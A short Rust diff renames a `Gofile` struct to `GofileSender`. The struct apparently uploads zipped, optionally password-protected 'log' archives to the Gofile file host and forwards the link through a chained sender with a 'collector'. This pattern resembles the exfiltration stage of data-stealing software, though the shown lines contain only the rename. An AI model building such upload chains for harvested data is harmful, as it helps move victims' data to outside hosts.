@@ -12,7 +12,7 @@ use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
 /// If the log is a zipped archive ([`LogFile::ZipArchive`]), this struct uploads it to
 /// Gofile and then invokes the inner sender with [`LogFile::ExternalLink`].
 #[derive(new, Clone)]
-pub struct Gofile<T: LogSender> {
+pub struct GofileSender<T: LogSender> {
     inner: T
 }
 
@@ -40,7 +40,7 @@ fn upload(name: &str, bytes: Vec<u8>) -> Option<String> {
     )
 }
 
-impl<T: LogSender> LogSender for Gofile<T> {
+impl<T: LogSender> LogSender for GofileSender<T> {
     fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
